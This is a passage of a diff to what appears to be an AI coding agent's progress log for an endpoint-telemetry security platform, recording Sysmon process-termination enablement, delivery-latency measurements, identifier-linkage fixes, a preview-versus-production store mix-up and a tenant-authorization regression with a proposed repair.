+is inside the story engine, needs its own measured pass; (4) B3
+implementation pending contract approval; (5) delivery-fidelity needs
+sensor per-channel read/sent counters for boundaries B1/B2.
+
+---
+
+## B5.1 · PRE FIDELITY BASELINE · EID5 OWNER COMMAND · B3 DECISIONS · CAMPAIGN STORY PROFILE — 2026-06 · OWNER REVIEW PENDING
+Report: `docs/B5_1_FIDELITY_BASELINE_AND_PROFILE.md`
+`process_exit` ACCEPTED as the single canonical event type (owner
+decision); `ProcessTerminate` stays source/provenance terminology.
+Endpoint UNCHANGED · not deployed · trajectory frozen · no hashing code.
+
+**FIDELITY · backend half BUILT AND RUN** (`scripts/b5_delivery_fidelity.py`),
+**endpoint half PREPARED, NOT RUN** (`docs/B5_FIDELITY_ENDPOINT_COUNT_READONLY.ps1`,
+read-only, PRE/POST labelled). Boundary availability stated, never
+inferred: B0 endpoint-only · **B1 NOT MEASURABLE (the sensor exposes no
+per-channel read counter)** · B2 PARTIAL · B3 accepted MEASURED · B3
+refused MEASURED **but incomplete — a PARSE_ERROR is NOT recorded as a
+routing block** (0 blocks logged while the collector state says "parser
+failed on every event", received 1/parsed 0 — the same blindness that
+made Wave A's `windows-security-evd` loss hard to find) · dedupe
+MEASURED (3,299 suppressed — correct, NOT loss) · B4 MEASURED.
+Baseline for 2026-09-22 15:43–16:46Z: EID 1=16, 3=70, 11=107, 12=766,
+13=2335, 22=1, +2 winsec = 3,297.
+**DESIGN-CHANGING MEASUREMENT: delivery is heavily spooled** —
+sensor→collector p50 **59 min**, collector→NivX p50 **43 min**, max
+**2.9 DAYS**. My original "wait 5 minutes" would have reported an entire
+hour as LOSS when it was LATENCY. Corrected: compare at T+24 h, re-count
+at T+72 h before calling anything lost.
+
+**EID 5 OWNER COMMAND — exact, with rollback.** Backup →
+`(Get-Content …) -replace '<ProcessTerminate onmatch="include"/>',
+'<ProcessTerminate onmatch="exclude"/>'` → `Compare-Object` →
+`Sysmon64.exe -c <file>` → verify with `Sysmon64.exe -c` dump. Rollback =
+restore the .bak and re-apply. No service restart, no audit policy, no
+registry, no other Sysmon setting. ~+0.5% telemetry. NOT EXECUTED BY ME.
+
+**B3** six decisions presented as DECISION|OPTIONS|SECURITY|PERFORMANCE|
+RECOMMENDED|WHY. No hashing code until they are approved as answers.
+
+**CAMPAIGN STORY PROFILE (read-only, no code changed).** 10.99 s, 15
+activities. Dominant stage = `campaign_story._activity()` doing up to two
+`find_one`s per activity against `v2_shadow_observations` (256,944 docs)
+on **UNINDEXED** fields: `canonical_event_id` (0.51 s, 256,944 examined)
+and `event.provenance.ingest_job_id` (0.55 s, 256,944 examined) →
+15 × 2 ≈ 8–16 s = the whole request. **Measured minimum fix: TWO INDEXES,
+no code change** — `{tenant_id, canonical_event_id}` and
+`{tenant_id, event.provenance.ingest_job_id}`. Proven with a reversible
+probe: 0.51 s / 256,944 examined → **0.000 s / 0 examined**; probe
+indexes then DROPPED and the original 12-index state verified restored.
+**Second finding: `resolved_via` is None for ALL 15 activities** — no
+detection in that incident binds to its canonical observation. An E1
+LINKAGE gap, not performance; untouched, needs its own pass.
+
+**OPEN:** owner to (1) run the PRE endpoint count, (2) apply the EID 5
+one-liner after PRE, (3) approve the six B3 decisions, (4) authorise the
+two campaign-story indexes. Platform gaps: sensor per-channel counters
+(B1/B2), parse failures not recorded as refusals, detection→observation
+linkage.
+
+---
+
+## B5.2 · PROVENANCE LINKAGE ROOT CAUSE + CAMPAIGN STORY INDEXES — 2026-06 · OWNER REVIEW PENDING
+Report: `docs/B5_2_LINKAGE_ROOT_CAUSE_AND_INDEX_PROOF.md`
+
+**CORRECTION OF MY OWN B5.1 CLAIM.** "resolved_via None for all 15" was
+WRONG — I read a top-level key that does not exist. The field is
+`provenance.process_identity_resolved_via`, and all 15 resolve, via
+`raw_event_id`. The chain is NOT severed; it survives on its SECONDARY
+reference.
+
+**ROOT CAUSE = `REFERENCE_TRANSLATED_INCORRECTLY`, 1,674/1,674
+detections (374 incidents).** Two minting schemes for one identity:
+`canonical_bridge.py:508` (the AUTHORITY) mints
+`f"cev_{raw_id[4:]}_{gen}"` (strips `raw_`, keeps the REPLAY GENERATION)
+and agrees with `edr_raw_events.derivations[].event_id` and with the
+shadow projection; `detection_content/telemetry/nivxforge_sensor_dsm.py:82`
+mints `f"cev_{trace_id}_pl"` (keeps `raw_`, drops the generation).
+Shadow holds ZERO `_pl` ids while `xdr_canonical_evidence` holds them ⇒
+duplicate authority. Resolution: **0/1,674 by primary**, 1,460 (87.2%)
+by secondary (`ingest_job_id`), **214 (12.8%) unresolved =
+`REFERENCED_OBSERVATION_NOT_FOUND` / `RAW_EVENT_ABSENT`, ALL in 214
+distinct synthetic `p0f-*` proof tenants, one each — ZERO in real
+tenants.** No REFERENCE_NOT_EMITTED, no REFERENCE_DROPPED, no
+CROSS_TENANT_REFUSED, no LEGACY_WITHOUT_REFERENCE. No evidence lost, no
+mis-attribution: the fallback reference is itself authoritative.
+
+**REPAIR PROPOSED, NOT IMPLEMENTED (needs approval):** R1 one exported
+minting function on the authority (`canonical_event_id(raw_id, gen)`);
+R2 CARRY the id, never `setdefault` over it; R3 resolver order
+authority-id → legacy `_pl` → `ingest_job_id`, all authoritative, still
+reporting which was used; R4 regressions incl. cross-tenant refusal and
+`RAW_EVENT_ABSENT` staying unbound; R5 NO migration — the 214 synthetic
+rows are reported, never back-filled. ~4 lines of code, no data change.
+Third scheme noted for the same pass: the DSM planes mint
+`sysmon-<eid>-<hash>`.
+
+**CAMPAIGN STORY INDEXES — APPLIED (owner-authorised), declared in
+`server.py`:** `obs_tenant_canonical_event_id`,
+`obs_tenant_ingest_job_id`. **10.99 s → 0.311/0.295/0.301 s (~36×)**;
+both lookups 256,944 docs examined → **0**; **response body
+byte-identical to PRE**; 15 activities unchanged;
+`process_identity_resolved_via` unchanged; cross-tenant still 403
+TENANT_NOT_FOUND. No application logic changed. device-trajectory stays
+3.5 s.
+
+**OPEN:** (1) owner runs the read-only Fidelity PRE endpoint script —
+PRE is NOT complete without that transcript; (2) then the EID 5
+one-liner, POST validation at T+24 h (59-min p50 / 2.9-day worst-case
+spool); (3) approve R1–R4; (4) approve the six B3 decisions; (5) sensor
+per-channel counters + parse-failures-not-logged-as-refusals remain open.
+
+## 2026-06 · CLOSURE WAVE DONE — identifier authority → parse/delivery
+## observability → delivery counters → B3 file identity (STOPPED before EID5 PRE)
+Full report: `docs/C_CLOSURE_WAVE_IDENTIFIER_DELIVERY_FILE_IDENTITY.md`.
+- **R1–R4 IDENTIFIER AUTHORITY (P0) DONE.**
+  `canonical_bridge.canonical_event_id(raw_id, generation)` is the SOLE
+  minting authority on the affected canonical path; the bridge publishes it
+  on `_authenticated_ingest.canonical_event_id`; the sensor DSM CARRIES it
+  and publishes `provenance.canonical_event_id_basis`. `_pl` is never
+  minted again (source-asserted); `canonical_bridge` holds exactly ONE
+  `cev_` format string. End-to-end proof: bridge result,
+  `v2_shadow_observations`, `edr_raw_events.derivations[].event_id`,
+  `xdr_canonical_evidence` and the campaign detection row all name the
+  SAME id and resolve via PRIMARY (the `xdr_canonical_evidence` duplicate
+  authority is gone for new data).
+- **READ RESOLUTION (R3) DONE.** New `edr_plane/evidence_resolution.py`:
+  authority id → legacy `_pl` → `ingest_job_id`, authoritative references
+  only, no heuristics, tenant in every query (cross-tenant resolves to
+  nothing and discloses nothing). Campaign Story publishes
+  `resolution_is_fallback`, `canonical_event_id_form`,
+  `resolution_attempts[]`, `resolution_unresolved_reason`, and now raises
+  `canonical_id_scheme_divergence` on ANY fallback. LIVE
+  `inc_c253027ba781494684db`: 15/15 resolve, all LEGACY fallback, 0.367 s.
+  Debt baseline measured: 1,680 legacy refs vs 4 authority refs; 254,943
+  historical `_pl` rows in `xdr_canonical_evidence` — NOT migrated.
+- **PARSE/REFUSAL VISIBILITY + DELIVERY COUNTERS DONE.** New
+  `edr_plane/delivery_counters.py` (`edr_delivery_counters`, `$inc` only,
+  keyed tenant/endpoint/channel, `evidence_authority:false`), wired into
+  `/api/edr/agent/telemetry` with reason codes, published read-only on
+  `GET /api/edr/wave0/raw-events/stats` as `delivery_boundaries`. Two
+  accounting layers (storage / canonicalisation). LIVE tenant `default`:
+  received 365, accepted 364, dedup_payload 1, parsed/canonicalized 363,
+  parse_failed 1 (`PARSER_FAILED`, channel `UNPARSEABLE_ENVELOPE`),
+  unaccounted_received 0, unaccounted_accepted 0.
+- **SENSOR COUNTERS + B3 HASHING: CODE-COMPLETE, DEFAULT OFF, NOT
+  DEPLOYED.** `agents/nivxforge-{linux,windows}/nivxforge_delivery_counters.py`
+  (`NIVX_SENSOR_DELIVERY_COUNTERS`) and `nivxforge_content_acquisition.py`
+  (`NIVX_SENSOR_FILE_HASHING`); heartbeat accepts additive
+  `counter_epoch`/`delivery_counters` (422 `SENSOR_COUNTER_REFUSED` on
+  anything malformed); epoch change keeps the previous snapshot instead of
+  decreasing. Server contract `edr_plane/file_content_acquisition.py`:
+  `PROCESS_IMAGE_SHA256 != FILE_CONTENT_SHA256 != RAW_PAYLOAD_CONTENT_DIGEST`,
+  digest admitted only on ACQUIRED + declared content_version_state +
+  acquired_at + 64-hex; torn read discarded; `CHANGED_SINCE_EVENT`
+  retained and labelled; UNKNOWN never becomes BENIGN.
+- **TESTS:** 70 new cases (`tests/edr/test_c1..c5`), `tests/edr` **1,759
+  passed / 2 skipped**. Pre-existing, NOT caused by this wave (verified by
+  stashing): 3 failures in `tests/test_b4b5_tenant_registry_authority.py`.
+- **NOT CHANGED, CLASSIFIED:** the third identifier scheme
+  (`sysmon_dsm.py:229` `sysmon-<eid>-<uuid4>`, `windows_security_dsm.py:639`
+  `uuid4`) is a NON-DETERMINISTIC per-normalisation surrogate — it
+  identifies a normalisation pass, not an immutable raw event. Converting
+  it needs a stable raw identity on the XDR collector path: own decision.
+- **DATA:** no evidence written/rewritten/migrated/deleted; only counter
+  documents in the new collection + one index. **ENDPOINT: unchanged.
+  DEPLOYED: no.**
+- **OPEN / NEXT:** (1) owner runs the read-only EID5 **PRE** script and
+  returns the transcript — PRE is not complete without it; (2) then the
+  approved ProcessTerminate change, POST at T+24 h; (3) LIVE proof of
+  primary-id resolution needs one new rule-matching detection;
+  (4) then the owner's stated sequence E4 reputation/file intelligence →
+  E3 detection expansion → E5 behavioural correlation (UEBA later).
+
+## 2026-06 · EID5 BLOCKED (config authority gap) · OWNER CHOSE OPTION B
+Reports: `docs/B5_EID5_SYSMON_XML_PROVENANCE_INVESTIGATION.md`,
+`docs/B5_SYSMON_XML_RECOVERY_HUNT_READONLY.ps1`, `docs/E3_NEXT_STEP_PROPOSAL.md`.
+- EID5 status: **BLOCKED_ON_EXACT_SYSMON_ROLLBACK_ARTIFACT**. `ProcessTerminate
+  = include` (no child rules) => EID5_NOT_COLLECTED; `termination_state` stays
+  `PROCESS_LIFETIME_UNKNOWN` everywhere. NOT a reason to weaken semantics.
+- PRE accepted: DESKTOP-A9HGFJJ, run 621b79c3-bf4e-49ad-ad42-14bac02b2449,
+  rules SHA `6eecc58c...0cba8f`, EID1=185 / EID5=0 in window, EID5 anywhere=0.
+- The enablement script HALTED twice at G2 (config XML missing) - fail-closed
+  worked. `C:\NivX\sysmon\nivx-w1-sysmon.xml` is gone from disk; Sysmon 15.22
+  still names it, live ConfigHash `0BAE60B3...9C9A7AC`.
+- WORKSPACE RECOVERY EXHAUSTED -> `ORIGINAL_XML_RECOVERED = NO`. Provenance is
+  `memory/W1_PHASE1_WINDOWS_LAPTOP_PREP.md` S1.3 (single revision, the only
+  writer anywhere; the Windows installer has zero Sysmon references). 96
+  byte-level reconstructions, 2,245 commits (pickaxe + blob grep), 12,515
+  workspace files and the handoff zip: no artefact hashes to `0BAE60B3...`.
+  PRD history shows the same `0BAE60B3...` recorded at W1 Phase 1, so the
+  deployed file never changed - only its bytes differed from the doc text.
+- Semantic recovery is complete (19/19 event classes match the live `-c` dump)
+  but semantic != byte-exact, so exact rollback is NOT guaranteed.
+- OWNER DECISION: Option B (zero-apply hold). No `Sysmon64 -c <config>`, no
+  registry import, no service restart, no reconstructed XML applied, no new
+  baseline. Read-only endpoint hunt block delivered, awaiting owner run.
+- TRACK SPLIT: Track A = recover exact config -> enable EID5 safely.
+  Track B = E3 deterministic detection hardening (proposal measured and
+  written): E3-A close the 9-rule declaration debt (28/37 declare today),
+  E3-B partial-absence negative controls (66 negative fixtures test wrong
+  values, never absent ones), E3-C collected-telemetry coverage map.
+  Baseline measured: 0/37 rules fire or raise on an empty canonical event.
+- ENDPOINT_CHANGED: NO · DEPLOYED: NO · DATA_CHANGED: NO.
+
+## 2026-09-29 · B5 EID5 END-TO-END = WAITING_FOR_DELIVERY (read-only gate)
+Report: `docs/B5_EID5_END_TO_END_ACCEPTANCE_REPORT.md`. Owner superseded the
+old blocker: `OLD_ROLLBACK_BLOCKER = CLOSED` (v2 baseline `F5FFD2CA...16C9B9`,
+EID5 candidate `9398464D...0362E3` applied, exit 0, EID5 generation PROVEN on
+DESKTOP-A9HGFJJ with 10 GUID-identical EID1/EID5 pairs at ~14:48-14:50 UTC).
+- GATE 1 code contract PASS 8/8 (`windows_eventlog.py:83,668-694`,
+  `sysmon_dsm.py:241`, `process_identity.py:68,205-252`): EID5 -> process_exit,
+  UtcTime -> exit_time only (start_time declared not_observed), ProcessGuid
+  authoritative, no identity => no process_key, PID-only never joins.
+  NUANCE: GUID key is tenant-scoped (`guid|tenant|guid`); cross-endpoint
+  separation rests on the machine component inside the Sysmon GUID.
+- GATE 2: NOTHING downstream. 0 WINDOWS_EVENT_LOG envelopes, 0
+  `<EventID>5</EventID>`, 0 `process_exit` in either canonical store, 0/10
+  ProcessGuids anywhere. Host has 3,300 canonical rows (EIDs 1/3/11/12/13/22/
+  4624/4672, tenant `ten_f1a5479243e901cf159e230fa0`) but newest ingest is
+  2026-09-25T15:35Z - FOUR DAYS BEFORE enablement - and they arrived on the
+  XDR COLLECTOR path (`col-timecheck-*`), not the EDR agent path. The host is
+  not in `edr_endpoints`. No collector seen in 7 days.
+- B0 PROVEN (owner) · B1-B3 NOT_MEASURABLE (sensor counters OFF by design) ·
+  B4-B9 NOT_YET_OBSERVED. NOT loss, NOT refused - nothing was refused anywhere.
+- GATE 5 PASS: 38 focused tests (`test_b5_process_termination.py`,
+  `test_b2_process_identity.py`). GATE 8: all processes correctly remain
+  PROCESS_LIFETIME_UNKNOWN; no history reconstructed.
+- GATE 6: tenant counters all 0 for the Windows tenant; `default` (Linux)
+  received 1047 / accepted 1046 / canonicalized 1044 / parse_failed 2 /
+  unaccounted 0-0. No boundary derived by subtraction.
+- OPEN FOR OWNER: confirm which backend URL the laptop's sensor delivers to -
+  the preview URL changed when this environment forked, so spool latency may
+  not be the only explanation. Read-only; nothing run on the endpoint.
+- ENDPOINT_CHANGED: NO · DEPLOYED: NO · DATA_CHANGED: NO · E3 NOT started.
+
+### 2026-09-29 — B5 EID5 DELIVERY RECHECK (read-only, no changes)
+- Owner supplied endpoint proof: sensor destination `https://nivxray.nivxforge.com`
+  CONFIRMED, service Running/Automatic, outbox 238,920,951 / offset advancing
+  +103,109 bytes over 120 s, backlog 15,030,785 bytes DRAINING. Old Sysmon
+  rollback blocker CLOSED.
+- Backend recheck in THIS environment (`https://greeting-app-5782.preview.emergentagent.com`,
+  DB `test_database`): still 0 Sysmon EID5, 0 `ProcessTerminate`, 0 canonical
+  `process_exit`/`ACTIVITY_PROCESS_TERMINATION`, 0 Windows sensor envelopes in
+  `edr_raw_events`, `DESKTOP-A9HGFJJ` absent from `edr_endpoints`.
+- Exact full-GUID lookup: 0/10 known ProcessGuids; the whole current Sysmon
+  session suffix `-000000002100` appears 0 times. The 3,295 `9949e5f2` hits are
+  the older session suffix `-000000002000` (2026-09-22).
+- Newest Windows record: Sysmon EID 12, EventRecordID 3312734, activity
+  2026-09-22 16:20:09.742, ingested 2026-09-25T15:35:33Z, connector
+  `windows-eventlog-g1proof01` (XDR collector path, not the EDR agent path).
+- `edr_delivery_counters` distinct tenants = ["default"] only; NO counter
+  document exists for tenant `ten_f1a5479243e901cf159e230fa0` or the Windows
+  endpoint. Sensor-side per-event counters: NOT_MEASURABLE (OFF by design).
+  No loss inferred.
+- Measured fact reported, not a conclusion: sensor destination hostname differs
+  from this preview environment hostname; cross-environment store identity is
+  not measurable from inside this pod.
+- Identifier authority regression: 0 `_pl`-suffixed ids in newest 200
+  `xdr_canonical_evidence` docs (Closure Wave holds).
+- DECISION: `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY`. Pending boundary =
+  BACKEND RECEIVE. 16 EID1 remain `PROCESS_LIFETIME_UNKNOWN`, not backfilled.
+- Report: `/app/docs/B5_EID5_DELIVERY_RECHECK_READONLY.md`
+- ENDPOINT_CHANGED: NO · DEPLOYED: NO · DATA_CHANGED: NO · UI_CHANGED: NO ·
+  E3 NOT started.
+
+
+### 2026-09-29 — B5 STORE IDENTITY CHECK (read-only) → DIFFERENT_STORE_PROVEN
+- `nivxray.nivxforge.com` → Cloudflare `162.159.142.117` / `172.66.2.113`, served by
+  the DEPLOYED production runtime of app `greeting-app-5782` (in-repo deploy RCA:
+  custom domain verified, frontend_type cloudflare, target-3, 2 replicas,
+  nginx:8080, backend uvicorn:8001, tier_0). `GET /api/health` → 200 `nivxray-api`.
+- This agent pod = PREVIEW: container `agent-env-630704a1-...`,
+  `preview_endpoint=https://greeting-app-5782.preview.emergentagent.com`
+  (Cloudflare `104.18.10.243/11.243`), job `486146a0-...`.
+- Store queried by all prior B5 rechecks = `mongodb://localhost:27017` /
+  `test_database`, a `mongod` (pid 278) running INSIDE this agent container with
+  NO ingress exposure (only 3000 and 8001 are routed).
+- **STORE_IDENTITY = DIFFERENT_STORE_PROVEN.** Traffic delivered to
+  `nivxray.nivxforge.com` cannot physically write into a loopback-only mongod in
+  the agent container. Therefore absence of EID5 in the preview store is NOT
+  evidence of production receive failure. This also explains why only the old
+  Sept 22 / Sept 25 XDR-collector rows are visible here.
+- `PENDING_BOUNDARY = AUTHORITATIVE_RECEIVE_STORE_IDENTITY` (supersedes the
+  earlier, imprecise "BACKEND RECEIVE"). No loss inferred.
+- Authoritative read-only options identified, NONE executed, all need owner
+  approval: (1) Emergent deployer in debug/diagnose mode (reads prod pod runtime,
+  DB binding, secret presence; diagnoses only, cannot write prod data);
+  (2) authenticated read-only API reads against the production domain using
+  existing read endpoints; (3) owner-side deployment panel read of prod DB config.
+- `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY` (not PASS, not BLOCKED).
+- Report: `/app/docs/B5_STORE_IDENTITY_CHECK_READONLY.md`
+- ENDPOINT_CHANGED: NO · DEPLOYED: NO · DOMAIN_CHANGED: NO · DATA_CHANGED: NO ·
+  DATA_COPIED: NO · UI_CHANGED: NO · E3 NOT started.
+
+
+### 2026-09-29 — B5 SCOPE CORRECTION: PREVIEW IS OUT OF SCOPE (owner ruling)
+- PERMANENT RULE: every telemetry acceptance proof MUST name the runtime/store it
+  was measured against. Preview `mongodb://localhost:27017` / `test_database` is
+  NEVER production evidence and must not be used for B5 or any later acceptance
+  gate. Preview is not operational for this program.
+- The only live, authoritative path:
+  `DESKTOP-A9HGFJJ` -> `NivXForgeSensor` (`--backend https://nivxray.nivxforge.com`)
+  -> PRODUCTION backend -> PRODUCTION database.
+- All earlier B5 arrival findings (0 EID5, 0/10 ProcessGuids, no delivery counters)
+  are hereby scoped to the PREVIEW store only and carry NO weight for B5.
+- NO EID5 DEFECT IS DEMONSTRATED. The only real problem was that validation was
+  measuring the wrong store.
+- Read-only production diagnose dispatched to the Emergent deployer with
+  `intent=debug` (diagnose, no deploy): deployer job ref
+  `95e7e8cd-6528-4f50-8702-566d0dc3b0ce`, dispatched twice (initial brief +
+  scope-clarification follow-up). Both queued; the deployer runs asynchronously
+  and had NOT returned findings at the time of writing. No production result has
+  been produced or assumed.
+- Brief asked production for: deployment/run identity, runtime (pods/replicas/
+  image/tier/health), DB type, safe DB name, MONGO_URL/DB_NAME binding PRESENCE
+  only, which store receives `/api/edr/agent/telemetry`, any `DESKTOP-A9HGFJJ`
+  EDR-agent telemetry, Sysmon EID5/`ProcessTerminate` presence, exact-value lookup
+  of the 10 ProcessGuids, ingest-route log/status evidence, and production
+  `edr_delivery_counters` (absence stated as absence, never as measured zeros).
+- Conditional chain proof requested if EID5 present: receive -> acceptance/refusal/
+  dedupe -> DSM/parser -> canonical `process_exit` -> ProcessGuid binding ->
+  lifecycle termination -> canonical_event_id authority, including explicit
+  `UtcTime -> exit_time` (correct) vs `UtcTime -> process.start_time` (defect).
+- STATUS UNCHANGED: `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY`
+  (`PENDING_BOUNDARY = AUTHORITATIVE_RECEIVE_STORE_IDENTITY`). No loss inferred.
+- ENDPOINT_CHANGED: NO · DEPLOYED: NO · PROD_RESTARTED: NO · CONFIG_CHANGED: NO ·
+  DATA_CHANGED: NO · UI_CHANGED: NO · PROD_CREDENTIALS_USED: NO · E3 NOT started.
+
+
+### 2026-09-29 — B5 PRODUCTION EID5 BLOCKER RESOLUTION (prod diagnose COMPLETE)
+- AUTHORITATIVE PRODUCTION FACTS (store `greeting-app-5782-test_database`,
+  Emergent-managed Atlas; deployment `96834a37-...`; **active run
+  `d85f3698-86ec-4f79-ac6a-e1309f96cd13`, built 2026-09-27T09:52:56Z**, tier_3,
+  target-6, image `greeting-app-5782:d85f3698-...`):
+  - `POST /api/edr/agent/telemetry` -> collection `edr_raw_events` (runtime-proven).
+  - DESKTOP-A9HGFJJ = `ep_1989031c8c1d0085812f`, tenant
+    `ten_e759b7288598bd882e3dcac49d`, ENROLLED / REPORTING, 116,012 raw events,
+    `last_telemetry_at 2026-09-29T15:28:33Z`, `outbox_queue_depth 7,181`,
+    ingest 200 OK every 1-3 s to 15:33:23Z, no 401/403/413/429/5xx.
+    **DESKTOP-A9HGFJJ_PROD_RECEIVE = PROVEN.**
+  - Sysmon EID5 = 0 (control EID1 = 210 -> matcher valid); 0/10 ProcessGuids by
+    exact lookup; 0 canonical `process_exit`. **Replay frontier ~2026-09-29T
+    07:32:08Z** (`payload.observed_at` of newest ingested raw), ~7 h behind the
+    14:48-14:50Z EID5 batch. NOT loss.
+  - `edr_delivery_counters` collection ABSENT in prod (no counters, not zeros).
+  - prod `derivations.parser_state`: OK 44,329 / FAILED 71,744 with
+    `WINDOWS_EVENT_ID_NOT_SUPPORTED`, `WINDOWS_PROVIDER_NOT_SUPPORTED`,
+    `WINDOWS_EVENT_XML_MALFORMED`.
+  - Platform: 2nd replica Pending since 09-27, `FailedCreatePodSandBox` (no IPs in
+    10.55.38.1-10.55.39.254). Serving 1/2. Emergent-side capacity item, no loss.
+  - Legacy caution: the 44,282 `xdr_canonical_evidence` / 5 `xdr_canonical_events`
+    docs came from the OLD connector route `POST /api/xdr/ingest/telemetry`
+    (`nivx-sysmon-forwarder/1.0@DESKTOP-A9HGFJJ`, ~09-18), not the sensor path.
+- **NEW DEMONSTRATED VERSION GAP (deployment currency, not source correctness):**
+  prod build is 2026-09-27T09:52Z (last commit at/before: `fdb9c05a` 09-27T09:37),
+  but `("sysmon", 5): ACTIVITY_PROCESS_TERMINATION` was introduced in
+  `91e561f6` 2026-09-29T11:44Z (`git log -S`, and `91e561f6^` has no match).
+  `process_identity.py` = `e66abc8f` 09-29T10:39; `canonical_bridge.py`,
+  `delivery_counters.py`, `file_content_acquisition.py` = `6afab68a` 09-29T12:48.
+  => When the frontier reaches 14:48Z, prod WILL refuse EID5 as
+  `WINDOWS_EVENT_ID_NOT_SUPPORTED`. **B5 PASS is unreachable on run d85f3698.**
+  Corroborated at runtime by the absent counters collection and the existing
+  `WINDOWS_EVENT_ID_NOT_SUPPORTED` refusals. No evidence lost: prod retains raw
+  bytes marked replayable, so refused EID5 can be replayed after a correct deploy.
+- Workspace source is already correct (EID5 admitted; `UtcTime -> exit_time` with
+  provenance `:UtcTime (EventID 5)`, never `start_time`; NOT_SUPPORTED/not_observed
+  declared). Re-ran read-only: `test_b5_process_termination.py` +
+  `test_b2_process_identity.py` = **38 passed**. NO PATCH WRITTEN, NONE NEEDED.
+- CLASSIFICATION: CASE B. `B5_EID5_END_TO_END = WAITING_FOR_DELIVERY`
+  (not PASS, not BLOCKED - EID5 never reached post-receive).
+- OWNER DECISION PENDING: authorise a production deploy of the current workspace
+  build (which closes the parser gap), then let the backlog drain / replay and
+  re-verify. E3 remains HOLD.
+- Report: `/app/docs/B5_EID5_PRODUCTION_BLOCKER_RESOLUTION.md`
+  Deployer RCA: `/app/deployer-agent-docs/RCA_d85f3698-86ec-4f79-ac6a-e1309f96cd13.MD`
+- DEPLOYED: NO · PROD_RESTARTED: NO · CONFIG/SECRET_CHANGED: NO · DATA_CHANGED: NO ·
+  ENDPOINT_CHANGED: NO · SENSOR_CHANGED: NO · OUTBOX_TOUCHED: NO · UI_CHANGED: NO ·
+  PREVIEW_EVIDENCE_USED: NO · E3: NOT STARTED.
+
+
+### 2026-09-29 — P0 PRODUCTION REGRESSION AFTER PUBLISH 100 (tenant authorization)
+- SYMPTOM: `edr.nivxforge.com` logged in as `admin@nivxray.com`, customer
+  "Internal Validation": Computers / Events / Dashboard freshness all 403
+  `TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL ... basis NOT_AUTHORIZED · tenant
+  ten_e759b7288598bd882e3dcac49d`. Worked on Publish 99, broke on Publish 100.
+- ROOT CAUSE (PROVEN in source): Publish 99 was built from `fdb9c05a`
+  (2026-09-27T09:37) where `dashboard_lenses.resolve_tenant_scope` granted
+  `all_tenants: True` from ROLE alone
+  (`_CROSS_TENANT_ROLES = {admin, platform_admin, soc_manager, mssp_operator}`).
+  Publish 100 contains `730ec4f5` (2026-09-28T07:31, P0-FIX-6B-2) which RETIRED
+  role-derived breadth: breadth now requires `users.authority_scope == "PLATFORM"`
+  exactly, or the tenant to be inside explicit `users.tenant_ids[]`.
+  The production `users` doc for admin@nivxray.com never received the explicit
+  designation, because `scripts/fix6b1b_platform_designation.py` does
+  `load_dotenv("/app/backend/.env")` -> it only ever ran against a NON-production
+  store. PREVIEW (reference only) holds `authority_scope: "PLATFORM"`,
+  `tenant_ids: ["default","nivx-live"]` — note ten_e759 is NOT in the grants, so
+  Internal Validation access depended ENTIRELY on the retired role breadth.
+  => New build fails closed, CORRECTLY. Boundary intact.
+- Auth-plane diff P99->P100: `edr_tenancy.py` +179, `session_context.py` +119,
+  `tenant_registry.py` +142, `server.py` +19 (P0-FIX-1 authorization-before-registry,
+  P0-FIX-2 non-disclosing refusal, P0-FIX-5A unconditional registry, P0-FIX-6B-2).
+- DATA_LOSS = NO: the 403 is raised in the `edr_tenant()` dependency before any
+  evidence query runs. Last authoritative prod measurement (P99, 15:28-15:33Z):
+  endpoint `ep_1989031c8c1d0085812f` present, 116,012 `edr_raw_events`, ingest 200 OK.
+- REPAIR_CLASS = GRANT_RESTORE (production DATA/designation continuity, NOT a code
+  fix, NOT rollback, NOT a broadening). Options proposed, NONE executed:
+  (1) idempotent startup designation from an explicit env var
+      (e.g. `NIVX_PLATFORM_PRINCIPAL`), server-side only, + deploy;
+  (2) run the existing owner-approved `fix6b1b_platform_designation.py` against
+      production (needs prod Mongo access; its `EXPECTED_GRANTS` guard must match);
+  (3) add `ten_e759...` to `tenant_ids[]` (narrowest, but repeats per customer).
+  FORBIDDEN and not considered: arbitrary tenant ids, default-tenant fallback,
+  trusting frontend tenant, registry bypass, all-tenants-for-all, disabling the
+  refusal code, changing fail-closed, frontend-hardcoded tenant, moving telemetry.
+- ROLLBACK NOT RECOMMENDED / NOT DONE: P100 carries the EID5 foundation + the four
+  P0 tenant-authority fixes; reverting would reinstate role-string breadth.
+- Read-only deployer diagnose dispatched for prod confirmation (tenant/endpoint/event
+  existence, the prod `users` doc fields, authority_scope holders, P99<->P100 store
+  continuity, 403 log/audit rows, and whether `/api/edr/agent/telemetry` is still 200).
+  Async, had NOT returned when this was written; all unconfirmed items = NOT_PROVEN.
+- `B5_EID5_END_TO_END = HOLD_PRODUCTION_AUTH_REGRESSION` (EID5 replay NOT performed).
+- Report: `/app/docs/P0_PROD_TENANT_AUTH_REGRESSION_PUBLISH100.md`
+- DEPLOYED: NO · REPUBLISHED: NO · ROLLED_BACK: NO · REPAIR_APPLIED: NO ·
+  DATA_CHANGED: NO · ENDPOINT/SENSOR/SYSMON/OUTBOX_CHANGED: NO · REPLAYED: NO ·
+  TENANT_ISOLATION_WEAKENED: NO · E3: NOT STARTED.
+
+
+### 2026-09-29 — P0 REPAIR (OPTION A): EXPLICIT PLATFORM DESIGNATION BOOTSTRAP
+- NEW `backend/services/platform_designation.py`, called from `server.py` startup
+  right after `seed_admin`, against the backend's own `db.users` (no second
+  connection string). Reads explicit env `NIVX_PLATFORM_PRINCIPAL`; for exactly
+  that one principal sets exactly one field `users.authority_scope = "PLATFORM"`
+  when absent. Machine-readable outcomes: `NOT_CONFIGURED` / `UPDATED` /
+  `ALREADY_CONFIGURED` / `REFUSED_MALFORMED_PRINCIPAL` /
+  `REFUSED_PRINCIPAL_NOT_FOUND` / `REFUSED_PRINCIPAL_AMBIGUOUS` /
+  `REFUSED_CONFLICTING_AUTHORITY_SCOPE` / `REFUSED_AUTH_STORE_UNREACHABLE` /
+  `REFUSED_DESIGNATION_NOT_VERIFIED`. Writes nothing on any refusal, logs ERROR,
+  never crashes startup, reads back and verifies after writing.
+- `backend/.env` gained `NIVX_PLATFORM_PRINCIPAL=admin@nivxray.com`. THIS VAR MUST
+  EXIST IN PRODUCTION or the designation is a documented NO-OP and the 403s persist.
+- Does NOT reintroduce `_CROSS_TENANT_ROLES`; `role == "admin"` still confers no
